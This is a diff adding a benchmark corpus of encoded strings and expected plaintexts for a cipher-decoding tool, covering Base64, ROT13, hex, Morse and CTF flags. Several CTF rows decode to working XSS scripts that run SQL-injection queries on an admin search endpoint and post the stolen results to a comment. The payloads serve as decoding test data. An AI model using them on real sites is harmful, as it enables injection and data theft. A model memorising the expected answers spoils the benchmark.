@@ -1,0 +1,191 @@
+# End-to-end corpus for benches/plaintext.rs --e2e (with benches/data/search.toml).
+# set<TAB>name<TAB>input<TAB>expected, where expected is the plaintext, `=` if the input
+# itself is plaintext, or `-` if there is no plaintext to find (any result is wrong).
+# Sets: issue1031 (tests/plaintext_detection.rs), regression (integration tests, library
+# and README examples), plaintext_input, flags (8 flags x 9 encodings), ctf (validated
+# cases of the closed CTF-corpus PR #848 and public challenges: picoCTF 13, Mod 26 and
+# Bases, OverTheWire Krypton 0 and 1) and no_answer (random digits, hex, hashes, letters,
+# Base64 of random bytes, card and phone numbers).
+issue1031	base64	SGVsbG8sIFdvcmxkISBUaGlzIGlzIGEgdGVzdCBvZiBjaXBoZXku	Hello, World! This is a test of ciphey.
+issue1031	rot13	Gur dhvpx oebja sbk whzcf bire gur ynml qbt	The quick brown fox jumps over the lazy dog
+issue1031	base64_three_times_ctf_flag	V20xNGFGb3pkSFZOTTA0d1RUSlNabGxxV1RCWU1teDZXREphTVdKdU1EMD0=	flag{n3st3d_b64_is_fun}
+issue1031	rot13_then_base64	enJyZyB6ciBuZyBndXIgaGZobnkgY3lucHIgbmcgZ3Jh	meet me at the usual place at ten
+issue1031	morse	... --- ... / ... . -. -.. / .... . .-.. .--. / -. --- .--	SOS SEND HELP NOW
+issue1031	hex_of_secret	736563726574	secret
+issue1031	hex_then_base64_of_secret	NzM2NTYzNzI2NTc0	secret
+issue1031	hex_of_20_bytes	63697068657920697320736f20636f6f6c212121	ciphey is so cool!!!
+issue1031	caesar_without_spaces	KHOORZRUOG	HELLOWORLD
+issue1031	caesar_sentence_without_spaces	WKHTXLFNEURZQIRAMXPSVRYHUWKHODCBGRJ	THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG
+issue1031	rot47	%96 BF:4< 3C@H? 7@I ;F>AD @G6C E96 =2KJ 5@8	The quick brown fox jumps over the lazy dog
+issue1031	reversed	yob llud a kcaJ sekam yalp on dna krow llA	All work and no play makes Jack a dull boy
+issue1031	atbash	zggzxp zg wzdm	attack at dawn
+issue1031	vigenere	Elq hepeeiep me phcmqr hyhqf gsi azq zew hepi zsnc xts etzqf oj xts ocmpur	The treasure is buried under the old oak tree near the river by the bridge
+issue1031	railfence	WECRLTEERDSOEEFEAOCAIVDEN	WEAREDISCOVEREDFLEEATONCE
+issue1031	base64_pico_ctf_flag	cGljb0NURntiNHMzXzY0XzFzX2Z1bn0=	picoCTF{b4s3_64_1s_fun}
+issue1031	base64_json	eyJrZXkiOiAidmFsdWUifQ==	{"key": "value"}
+issue1031	base64_short_phrase	Y2FsbCBtZQ==	call me
+issue1031	base64_french	SmUgbmUgc2FpcyBwYXMgY2UgcXVlIHR1IHZldXggZGlyZQ==	Je ne sais pas ce que tu veux dire
+issue1031	base64_german	V2lyIHRyZWZmZW4gdW5zIG1vcmdlbiBhbSBCYWhuaG9m	Wir treffen uns morgen am Bahnhof
+issue1031	rot13_flag	synt{guvf_vf_gur_synt}	flag{this_is_the_flag}
+issue1031	atbash_flag	uozt{gsrh_rh_gsv_uozt}	flag{this_is_the_flag}
+issue1031	rot13_pico_ctf_flag_with_hex	cvpbPGS{7r1o9r3n2s4q}	picoCTF{7e1b9e3a2f4d}
+issue1031	caesar_ductf_flag	GXFWI{g0zq_xqg3u}	DUCTF{d0wn_und3r}
+issue1031	railfence_pico_ctf_flag	pCb_1uioT{436_sfncFs4_}	picoCTF{b4s3_64_1s_fun}
+issue1031	rot47_htb_flag	w%qLD_>b07=c809bCbN	HTB{s0m3_fl4g_h3r3}
+regression	help_i_need_somebody	SGVscCBJIG5lZWQgc29tZWJvZHkh	Help I need somebody!
+regression	hello_there_general	aGVsbG8gdGhlcmUgZ2VuZXJhbA==	hello there general
+regression	rotate_me	Ebgngr zr 13 cynprf!	Rotate me 13 places!
+regression	quoted_printable_hello	=48=65=6C=6C=6F=20=57=6F=72=6C=64	Hello World
+regression	quoted_printable_wrapped_base64	UXVvdGVkLVByaW50YWJsZSB3cmFwcyBsb25nIGxpbmVzIGF0IDc2IGNoYXJhY3RlcnMgd2l0aCB=\r\nzb2Z0IGxpbmUgYnJlYWtz	Quoted-Printable wraps long lines at 76 characters with soft line breaks
+regression	utf16le_powershell	VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEgAZQBsAGwAbwAsACAAVwBvAHIAbABkACEAJwA=	Write-Output 'Hello, World!'
+regression	utf16le_powershell_issue_943	VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAgAHcAbwByAGwAZAAnAA==	Write-Output 'hello world'
+regression	utf16be_hex	00540068006500200071007500690063006b002000620072006f0077006e00200066006f00780020006a0075006d007000730020006f00760065007200200074006800650020006c0061007a007900200064006f0067	The quick brown fox jumps over the lazy dog
+regression	utf16le_bom_hex	fffe680065006c006c006f00200077006f0072006c006400	hello world
+regression	base85	RA^-&adl~9Yan8BZ+C7WW^Z^PYISXJb0BYaWpW^NXk{R5VS0HWWN&8	The quick brown fox jumps over the lazy dog
+regression	base85_twice	QbArVCShc3emPlTZa6|(D?>L|S6*6PP+3V+SW03rLRn!~a93VVSZjMyHC9tFNLN=*CO7	The quick brown fox jumps over the lazy dog
+regression	ascii85	<~<+ohcEHPu*CER),Dg-(AAoDo:C3=B4F!,CEATAo8BOr<&@=!2AA8c)~>	The quick brown fox jumps over the lazy dog
+regression	base64_of_ascii85	PH48K29oY0VIUHUqQ0VSKSxEZy0oQUFvRG86QzM9QjRGISxDRUFUQW84Qk9yPCZAPSEyQUE4Yyl+Pg==	The quick brown fox jumps over the lazy dog
+regression	jwt_io	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c	{"sub":"1234567890","name":"John Doe","iat":1516239022}
+regression	readme_rot13_hex_base64	NTA3NjYzNzU3MjZjMjA3NjY2MjA2OTcyNjU2YzIwNzM2ZTY2Njc=	Ciphey is very fast
+regression	readme_mount	bW91bnQgLW8gdXNlcm5hbWU9YmVlLHBhc3N3b3JkPWh1bnRlcjI=	mount -o username=bee,password=hunter2
+regression	readme_ip_hex	3139322e3136382e302e31	192.168.0.1
+regression	readme_flag_crib_free	cGljb0NURntiNHMzXzY0XzFzX2Z1bn0=	picoCTF{b4s3_64_1s_fun}
+plaintext_input	hello_world	Hello, World!	=
+plaintext_input	ip	192.168.0.1	=
+plaintext_input	sentence	The quick brown fox jumps over the lazy dog	=
+plaintext_input	flag	flag{this_is_the_flag}	=
+plaintext_input	json	{"key": "value"}	=
+plaintext_input	email	bee@skerritt.blog	=
+plaintext_input	url	https://github.com/bee-san/Ciphey	=
+plaintext_input	uuid	3f2b8c1e-9d4a-4f6e-8b7c-2a1d0e9f8c7b	=
+plaintext_input	short_phrase	meet me at noon	=
+plaintext_input	spaceless	WEAREDISCOVEREDFLEEATONCE	=
+flags	flag_words_rot13	synt{guvf_vf_gur_synt}	flag{this_is_the_flag}
+flags	flag_words_caesar3	iodj{wklv_lv_wkh_iodj}	flag{this_is_the_flag}
+flags	flag_words_atbash	uozt{gsrh_rh_gsv_uozt}	flag{this_is_the_flag}
+flags	flag_words_rot47	7=28LE9:D0:D0E9607=28N	flag{this_is_the_flag}
+flags	flag_words_reverse	}galf_eht_si_siht{galf	flag{this_is_the_flag}
+flags	flag_words_railfence3	f{s__glgti_stefa}ahihl	flag{this_is_the_flag}
+flags	flag_words_base64	ZmxhZ3t0aGlzX2lzX3RoZV9mbGFnfQ==	flag{this_is_the_flag}
+flags	flag_words_hex	666c61677b746869735f69735f7468655f666c61677d	flag{this_is_the_flag}
+flags	flag_words_rot13_base64	c3ludHtndXZmX3ZmX2d1cl9zeW50fQ==	flag{this_is_the_flag}
+flags	flag_hex_rot13	synt{7r1o9r3n2s4q}	flag{7e1b9e3a2f4d}
+flags	flag_hex_caesar3	iodj{7h1e9h3d2i4g}	flag{7e1b9e3a2f4d}
+flags	flag_hex_atbash	uozt{7v1y9v3z2u4w}	flag{7e1b9e3a2f4d}
+flags	flag_hex_rot47	7=28Lf6`3h6b2a7c5N	flag{7e1b9e3a2f4d}
+flags	flag_hex_reverse	}d4f2a3e9b1e7{galf	flag{7e1b9e3a2f4d}
+flags	flag_hex_railfence3	f{badlg719324}aeef	flag{7e1b9e3a2f4d}
+flags	flag_hex_base64	ZmxhZ3s3ZTFiOWUzYTJmNGR9	flag{7e1b9e3a2f4d}
+flags	flag_hex_hex	666c61677b3765316239653361326634647d	flag{7e1b9e3a2f4d}
+flags	flag_hex_rot13_base64	c3ludHs3cjFvOXIzbjJzNHF9	flag{7e1b9e3a2f4d}
+flags	pico_words_rot13	cvpbPGS{o4f3_64_1f_sha}	picoCTF{b4s3_64_1s_fun}
+flags	pico_words_caesar3	slfrFWI{e4v3_64_1v_ixq}	picoCTF{b4s3_64_1s_fun}
+flags	pico_words_atbash	krxlXGU{y4h3_64_1h_ufm}	picoCTF{b4s3_64_1s_fun}
+flags	pico_words_rot47	A:4@r%uL3cDb0ec0`D07F?N	picoCTF{b4s3_64_1s_fun}
+flags	pico_words_reverse	}nuf_s1_46_3s4b{FTCocip	picoCTF{b4s3_64_1s_fun}
+flags	pico_words_railfence3	pCb_1uioT{436_sfncFs4_}	picoCTF{b4s3_64_1s_fun}
+flags	pico_words_base64	cGljb0NURntiNHMzXzY0XzFzX2Z1bn0=	picoCTF{b4s3_64_1s_fun}
+flags	pico_words_hex	7069636f4354467b623473335f36345f31735f66756e7d	picoCTF{b4s3_64_1s_fun}
+flags	pico_words_rot13_base64	Y3ZwYlBHU3tvNGYzXzY0XzFmX3NoYX0=	picoCTF{b4s3_64_1s_fun}
+flags	pico_hex_rot13	cvpbPGS{7r1o9r3n2s4q}	picoCTF{7e1b9e3a2f4d}
+flags	pico_hex_caesar3	slfrFWI{7h1e9h3d2i4g}	picoCTF{7e1b9e3a2f4d}
+flags	pico_hex_atbash	krxlXGU{7v1y9v3z2u4w}	picoCTF{7e1b9e3a2f4d}
+flags	pico_hex_rot47	A:4@r%uLf6`3h6b2a7c5N	picoCTF{7e1b9e3a2f4d}
+flags	pico_hex_reverse	}d4f2a3e9b1e7{FTCocip	picoCTF{7e1b9e3a2f4d}
+flags	pico_hex_railfence3	pC792}ioT{ebeafdcF134	picoCTF{7e1b9e3a2f4d}
+flags	pico_hex_base64	cGljb0NURns3ZTFiOWUzYTJmNGR9	picoCTF{7e1b9e3a2f4d}
+flags	pico_hex_hex	7069636f4354467b3765316239653361326634647d	picoCTF{7e1b9e3a2f4d}
+flags	pico_hex_rot13_base64	Y3ZwYlBHU3s3cjFvOXIzbjJzNHF9	picoCTF{7e1b9e3a2f4d}
+flags	htb_rot13	UGO{f0z3_sy4t_u3e3}	HTB{s0m3_fl4g_h3r3}
+flags	htb_caesar3	KWE{v0p3_io4j_k3u3}	HTB{s0m3_fl4g_h3r3}
+flags	htb_atbash	SGY{h0n3_uo4t_s3i3}	HTB{s0m3_fl4g_h3r3}
+flags	htb_rot47	w%qLD_>b07=c809bCbN	HTB{s0m3_fl4g_h3r3}
+flags	htb_reverse	}3r3h_g4lf_3m0s{BTH	HTB{s0m3_fl4g_h3r3}
+flags	htb_railfence3	Hs_grT{03f4_33Bmlh}	HTB{s0m3_fl4g_h3r3}
+flags	htb_base64	SFRCe3MwbTNfZmw0Z19oM3IzfQ==	HTB{s0m3_fl4g_h3r3}
+flags	htb_hex	4854427b73306d335f666c34675f683372337d	HTB{s0m3_fl4g_h3r3}
+flags	htb_rot13_base64	VUdPe2YwejNfc3k0dF91M2UzfQ==	HTB{s0m3_fl4g_h3r3}
+flags	ductf_rot13	QHPGS{q0ja_haq3e}	DUCTF{d0wn_und3r}
+flags	ductf_caesar3	GXFWI{g0zq_xqg3u}	DUCTF{d0wn_und3r}
+flags	ductf_atbash	WFXGU{w0dm_fmw3i}	DUCTF{d0wn_und3r}
+flags	ductf_rot47	s&r%uL5_H?0F?5bCN	DUCTF{d0wn_und3r}
+flags	ductf_reverse	}r3dnu_nw0d{FTCUD	DUCTF{d0wn_und3r}
+flags	ductf_railfence3	DFwn}UT{0nudrCd_3	DUCTF{d0wn_und3r}
+flags	ductf_base64	RFVDVEZ7ZDB3bl91bmQzcn0=	DUCTF{d0wn_und3r}
+flags	ductf_hex	44554354467b6430776e5f756e6433727d	DUCTF{d0wn_und3r}
+flags	ductf_rot13_base64	UUhQR1N7cTBqYV9oYXEzZX0=	DUCTF{d0wn_und3r}
+flags	ctf_rot13	PGS{gur_dhvpx_oebja_sbk}	CTF{the_quick_brown_fox}
+flags	ctf_caesar3	FWI{wkh_txlfn_eurzq_ira}	CTF{the_quick_brown_fox}
+flags	ctf_atbash	XGU{gsv_jfrxp_yildm_ulc}	CTF{the_quick_brown_fox}
+flags	ctf_rot47	r%uLE960BF:4<03C@H?07@IN	CTF{the_quick_brown_fox}
+flags	ctf_reverse	}xof_nworb_kciuq_eht{FTC	CTF{the_quick_brown_fox}
+flags	ctf_railfence3	CtqkofT{h_uc_rw_o}Feibnx	CTF{the_quick_brown_fox}
+flags	ctf_base64	Q1RGe3RoZV9xdWlja19icm93bl9mb3h9	CTF{the_quick_brown_fox}
+flags	ctf_hex	4354467b7468655f717569636b5f62726f776e5f666f787d	CTF{the_quick_brown_fox}
+flags	ctf_rot13_base64	UEdTe2d1cl9kaHZweF9vZWJqYV9zYmt9	CTF{the_quick_brown_fox}
+flags	sekai_rot13	FRXNV{l0h_s0haq_z3}	SEKAI{y0u_f0und_m3}
+flags	sekai_caesar3	VHNDL{b0x_i0xqg_p3}	SEKAI{y0u_f0und_m3}
+flags	sekai_atbash	HVPZR{b0f_u0fmw_n3}	SEKAI{y0u_f0und_m3}
+flags	sekai_rot47	$tzpxLJ_F07_F?50>bN	SEKAI{y0u_f0und_m3}
+flags	sekai_reverse	}3m_dnu0f_u0y{IAKES	SEKAI{y0u_f0und_m3}
+flags	sekai_railfence3	SIuumEA{0_0n_3Kyfd}	SEKAI{y0u_f0und_m3}
+flags	sekai_base64	U0VLQUl7eTB1X2YwdW5kX20zfQ==	SEKAI{y0u_f0und_m3}
+flags	sekai_hex	53454b41497b7930755f6630756e645f6d337d	SEKAI{y0u_f0und_m3}
+flags	sekai_rot13_base64	RlJYTlZ7bDBoX3MwaGFxX3ozfQ==	SEKAI{y0u_f0und_m3}
+ctf	pr848_ctf_247ctf_custom_protocol_17_invalid_message_counter_	496e76616c6964206d65737361676520636f756e74657221	Invalid message counter!
+ctf	pr848_ctf_247ctf_custom_protocol_17_invalid_redundancy_check	496e76616c696420726564756e64616e637920636865636b21	Invalid redundancy check!
+ctf	pr848_ctf_247ctf_custom_protocol_17_invalid_section_count_he	496e76616c69642073656374696f6e20636f756e7421	Invalid section count!
+ctf	pr848_ctf_247ctf_custom_protocol_17_invalid_session_length_h	496e76616c69642073657373696f6e206c656e67746821	Invalid session length!
+ctf	pr848_ctf_247ctf_error_repor_1505d82c4e_22_send_the	53 65 6e 64 20 74 68 65 20 66 6c 61 67 21	Send the flag!
+ctf	pr848_ctf_247ctf_helicopter_ecff2a2792_32_comment	dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiUE9TVCIsIi9jb21tZW50LzIiLHRydWUpOwp2YXIgcGFyYW1zID0gImNvbW1lbnQ9aGFja2VkIjsKeGhyLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKeGhyLnNlbmQocGFyYW1zKTs=	var xhr = new XMLHttpRequest();\nxhr.open("POST","/comment/2",true);\nvar params = "comment=hacked";\nxhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\nxhr.send(params);
+ctf	pr848_ctf_247ctf_helicopter_ecff2a2792_32_secret_s	dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp2YXIgeGhyMiA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiUE9TVCIsICIvc2VjcmV0X2FkbWluX3NlYXJjaCIsIHRydWUpOwp4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp2YXIgcGFyYW1ldGVycyA9ICJzZWFyY2g9IiArIGVuY29kZVVSSSgiMSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYtLSIpOwp4aHIuc2VuZChwYXJhbWV0ZXJzKTsKeGhyLm9ubG9hZCA9IGZ1bmN0aW9uKCl7CnZhciByZXNwb25zZWZyb21wYWdlID0geGhyLnJlc3BvbnNlOwp4aHIyLm9wZW4oIlBPU1QiLCIvY29tbWVudC8zIix0cnVlKTsKdmFyIHBhcmFtcyA9ICJjb21tZW50PSIgKyBlbmNvZGVVUkkoYnRvYShyZXNwb25zZWZyb21wYWdlKSk7CnhocjIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp4aHIyLnNlbmQocGFyYW1zKTt9	var xhr = new XMLHttpRequest();\nvar xhr2 = new XMLHttpRequest();\nxhr.open("POST", "/secret_admin_search", true);\nxhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\nvar parameters = "search=" + encodeURI("1 union select 1,2,3,4,5,6--");\nxhr.send(parameters);\nxhr.onload = function(){\nvar responsefrompage = xhr.response;\nxhr2.open("POST","/comment/3",true);\nvar params = "comment=" + encodeURI(btoa(responsefrompage));\nxhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\nxhr2.send(params);}
+ctf	pr848_ctf_247ctf_helicopter_ecff2a2792_32_secret_s_2	dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp2YXIgeGhyMiA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiUE9TVCIsICIvc2VjcmV0X2FkbWluX3NlYXJjaCIsIHRydWUpOwp4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp2YXIgcGFyYW1ldGVycyA9ICJzZWFyY2g9IiArIGVuY29kZVVSSSgiLTEgdW5pb24gc2VsZWN0IDEsMiwzLDQsNSxmbGFnIGZyb20gZmxhZy0tIik7Cnhoci5zZW5kKHBhcmFtZXRlcnMpOwp4aHIub25sb2FkID0gZnVuY3Rpb24oKXsKdmFyIHJlc3BvbnNlZnJvbXBhZ2UgPSB4aHIucmVzcG9uc2U7CnhocjIub3BlbigiUE9TVCIsIi9jb21tZW50LzMiLHRydWUpOwp2YXIgcGFyYW1zID0gImNvbW1lbnQ9IiArIGVuY29kZVVSSShidG9hKHJlc3BvbnNlZnJvbXBhZ2UpKTsKeGhyMi5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7CnhocjIuc2VuZChwYXJhbXMpO30=	var xhr = new XMLHttpRequest();\nvar xhr2 = new XMLHttpRequest();\nxhr.open("POST", "/secret_admin_search", true);\nxhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\nvar parameters = "search=" + encodeURI("-1 union select 1,2,3,4,5,flag from flag--");\nxhr.send(parameters);\nxhr.onload = function(){\nvar responsefrompage = xhr.response;\nxhr2.open("POST","/comment/3",true);\nvar params = "comment=" + encodeURI(btoa(responsefrompage));\nxhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\nxhr2.send(params);}
+ctf	pr848_ctf_247ctf_helicopter_ecff2a2792_32_secret_s_3	dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp2YXIgeGhyMiA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiUE9TVCIsICIvc2VjcmV0X2FkbWluX3NlYXJjaCIsIHRydWUpOwp4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp2YXIgcGFyYW1ldGVycyA9ICJzZWFyY2g9IiArIGVuY29kZVVSSSgiOyciKTsKeGhyLnNlbmQocGFyYW1ldGVycyk7Cnhoci5vbmxvYWQgPSBmdW5jdGlvbigpewp2YXIgcmVzcG9uc2Vmcm9tcGFnZSA9IHhoci5yZXNwb25zZTsKeGhyMi5vcGVuKCJQT1NUIiwiL2NvbW1lbnQvMyIsdHJ1ZSk7CnZhciBwYXJhbXMgPSAiY29tbWVudD0iICsgZW5jb2RlVVJJKGJ0b2EocmVzcG9uc2Vmcm9tcGFnZSkpOwp4aHIyLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKeGhyMi5zZW5kKHBhcmFtcyk7fQ==	var xhr = new XMLHttpRequest();\nvar xhr2 = new XMLHttpRequest();\nxhr.open("POST", "/secret_admin_search", true);\nxhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\nvar parameters = "search=" + encodeURI(";'");\nxhr.send(parameters);\nxhr.onload = function(){\nvar responsefrompage = xhr.response;\nxhr2.open("POST","/comment/3",true);\nvar params = "comment=" + encodeURI(btoa(responsefrompage));\nxhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\nxhr2.send(params);}
+ctf	pr848_ctf_247ctf_helicopter_ecff2a2792_32_user0_ex	dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp2YXIgeGhyMiA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiR0VUIiwgIi91c2VyLzAiLCB0cnVlKTsKeGhyLnNlbmQoKTsKeGhyLm9ubG9hZCA9IGZ1bmN0aW9uKCl7CnZhciByZXNwb25zZWZyb21wYWdlID0geGhyLnJlc3BvbnNlOwp4aHIyLm9wZW4oIlBPU1QiLCIvY29tbWVudC8yIix0cnVlKTsKdmFyIHBhcmFtcyA9ICJjb21tZW50PSIgKyBlbmNvZGVVUkkoYnRvYShyZXNwb25zZWZyb21wYWdlKSk7CnhocjIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp4aHIyLnNlbmQocGFyYW1zKTt9	var xhr = new XMLHttpRequest();\nvar xhr2 = new XMLHttpRequest();\nxhr.open("GET", "/user/0", true);\nxhr.send();\nxhr.onload = function(){\nvar responsefrompage = xhr.response;\nxhr2.open("POST","/comment/2",true);\nvar params = "comment=" + encodeURI(btoa(responsefrompage));\nxhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\nxhr2.send(params);}
+ctf	pr848_ctf_247ctf_secured_session_47_ctf_247c	WW91IGdvdHRhIHRyeSB0aGUgY2hhbGxlbmdlIHlvdXJzZWxmIDpQ	You gotta try the challenge yourself :P
+ctf	pr848_ctf_247ctf_try_and_catch_70_calculat	number_1=1&number_2=0&operation=%2F	number_1=1&number_2=0&operation=/
+ctf	picoctf_13_rot13	cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}	picoCTF{not_too_bad_of_a_problem}
+ctf	picoctf_mod26_rot13	cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_hyLicInt}	picoCTF{next_time_I'll_try_2_rounds_of_rot13_ulYvpVag}
+ctf	picoctf_bases_base64	bDNhcm5fdGgzX3IwcDM1	l3arn_th3_r0p35
+ctf	krypton0_base64	S1JZUFRPTklTR1JFQVQ=	KRYPTONISGREAT
+ctf	krypton1_rot13	YRIRY GJB CNFFJBEQ EBGGRA	LEVEL TWO PASSWORD ROTTEN
+no_answer	digits6	980055	-
+no_answer	digits8	05476750	-
+no_answer	digits10	7202399093	-
+no_answer	digits12	095072819796	-
+no_answer	digits13	2553957507134	-
+no_answer	digits16	7583541338794897	-
+no_answer	digits20	72923255545623335432	-
+no_answer	digits32	62144424995015314181117486056392	-
+no_answer	hex4	26ecc9bc	-
+no_answer	hex8	4dc4be22afb9aec3	-
+no_answer	hex16	c8acc7ecfde8451488c54f17d7544276	-
+no_answer	hex24	0df85785590fc030bfa38b8ccb17a353d298be5ec8ac267c	-
+no_answer	hex32	733e62f3b014e4c23163418baa23635cf5b5e2a6ca14512c4e8d28ab694117bb	-
+no_answer	md5_apple	1f3870be274f6c49b3e31a0c6728957f	-
+no_answer	sha1_apple	d0be2dc421be4fcd0172e5afceea3970e2f3d940	-
+no_answer	md5_zebra	69c459dd76c6198f72f0c20ddd3c9447	-
+no_answer	sha1_zebra	38aa53de31c04bcfae9163cc23b7963ed9cf90f7	-
+no_answer	md5_ciphey	65aceb62e48136baaad4c3df3cc89bdf	-
+no_answer	sha1_ciphey	4ae6e6b0d2cc66305737df35a08b4d5d7b034290	-
+no_answer	sha256_x	2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881	-
+no_answer	upper8	NBBALDMJ	-
+no_answer	lower8	oeqyqqtl	-
+no_answer	upper12	LIHVORPFNTHM	-
+no_answer	lower12	cvlhkbspuxfy	-
+no_answer	upper20	MCUEUECCCYCSKDVQKYST	-
+no_answer	lower20	jwxyurqwufkxaqiqgluc	-
+no_answer	upper40	UDWDJHHQWXTBYJKPIWWOFVMWOVPMHOJTTAYFOOLW	-
+no_answer	lower40	ludetsuctzjfuooinjmwuptziwpsgeqlmyyvhewl	-
+no_answer	alnum10	3y7lnBk0Bq	-
+no_answer	ascii10	ahy;&^*sTz	-
+no_answer	alnum24	d9kxvR4cf4uROm1NXE0qrBTn	-
+no_answer	ascii24	^Czaix#Re3#7Ws%[VX7sZZ7x	-
+no_answer	alnum48	OTRIf20tRhy3X7RX2DNCrCRmS1pBm9OqdzYhARXoK3JcY4QM	-
+no_answer	ascii48	BI(AIA2c\\#k[_4l2?jMC2{-[&58uk4-`5Qix),ZYBVCfS-H;	-
+no_answer	base64_random6	DV+0dQXg	-
+no_answer	base64_random18	88UPLJ5rLbOEsGQTVEVuBd5f	-
+no_answer	base64_random33	2/JJVDgEflnayJ3OS7zldsR0fY/iwqvwu7Hg2ltEbLUN	-
+no_answer	visa	4961120871966029	-
+no_answer	mastercard	5178165610601664	-
+no_answer	phone	+1 555 0100 2234	-
